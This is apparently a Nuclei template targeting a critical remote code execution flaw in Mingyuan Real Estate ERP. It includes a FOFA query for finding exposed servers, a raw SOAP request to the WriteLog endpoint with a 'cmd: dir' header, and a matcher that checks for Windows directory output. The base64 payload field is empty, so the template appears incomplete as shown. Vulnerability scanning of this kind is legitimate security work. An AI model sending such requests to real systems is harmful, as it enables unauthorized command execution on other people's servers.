  author: leadlife
  severity: critical
  description:
  reference:
    - todo
  metadata:
    verified: true
    fofa-query: title="明源地产ERP" && icon_hash="-1520670993"
  tags: mydc,rce

http:
  - raw:
      - |
        POST /MyWorkflowManagement/WebService/WFWebService.asmx HTTP/1.1
        Host: {{Hostname}}
        SOAPAction: "http://tempuri.org/WriteLog"
        cmd: dir

        <?xml version="1.0" encoding="utf-8"?>
          <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
            <soap:Body>
              <WriteLog xmlns="http://tempuri.org/">
                <request>{{base64_decode("")}}</request>
              </WriteLog>
            </soap:Body>
          </soap:Envelope>
    
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body,'驱动器')
        condition: and